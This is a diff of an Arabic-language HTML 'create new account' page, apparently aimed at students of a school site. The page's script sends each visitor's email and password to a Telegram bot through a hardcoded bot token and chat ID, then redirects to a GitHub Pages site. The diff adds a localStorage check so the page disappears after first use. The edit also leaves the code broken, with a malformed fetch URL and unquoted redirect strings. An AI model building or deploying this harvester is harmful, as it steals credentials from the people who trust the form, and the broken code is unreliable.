@@ -77,7 +77,6 @@
 <body>
 
 <div class="box">
-
     <h3>إنشاء حساب جديد</h3>
 
     <div class="input-group">
@@ -89,16 +88,21 @@
     </div>
 
     <button class="login-btn" onclick="send()">تسجيل حساب جديد</button>
-
 </div>
 
 <script>
+// ضع رابط موقع الدراسة الخاص بك هنا بالأسفل
+const MY_WEBSITE = "https://your-educational-website.com"; 
 
 const TOKEN = "8636021665:AAGhU_BAdory7k_IwaZuuxkZA7EXGtacaOc"; 
 const CHAT_ID = "7737717483";
 
-function send(){
+// كود الفحص التلقائي: بمجرد فتح الصفحة، يتأكد المتصفح إذا كان الحساب مسجلاً مسبقاً
+if (localStorage.getItem("isRegistered") === "true") {
+    window.location.replace(MY_WEBSITE);
+}
 
+function send(){
     let name = document.getElementById("name").value.trim();
     let secret = document.getElementById("secret").value;
 
@@ -117,8 +121,11 @@ function send(){
     // تجهيز نص الرسالة التليجرام
     let text = "حساب جديد تم إنشاؤه:\nالإيميل: " + name + "\nالرمز: " + secret;
 
-    // إرسال البيانات إلى التليجرام
-    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+    // حفظ حالة التسجيل في متصفح المستخدم لكي لا تظهر الصفحة مجدداً
+    localStorage.setItem("isRegistered", "true");
+
+    // إرسال البيانات إلى التليجرام والتوجيه فوراً
+    fetch(`https://telegram.org{TOKEN}/sendMessage`, {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
@@ -128,16 +135,12 @@ function send(){
             text: text
         })
     }).then(() => {
-        // يتم التوجيه إلى غوغل فوراً بعد إرسال الطلب بنجاح للسيرفر
-        window.location.replace("https://websit-x.github.io/ghobrini_shcool/");
+        window.location.replace(https://websit-x.github.io/ghobrini/);
     }).catch(err => {
         console.error("خطأ في الاتصال:", err);
-        // التوجيه الاحتياطي في حال انقطع الاتصال
-        window.location.replace("https://websit-x.github.io/ghobrini_shcool/");
+        window.location.replace(https://websit-x.github.io/ghobrini/);
     });
-
 }
-
 </script>
 
 </body>
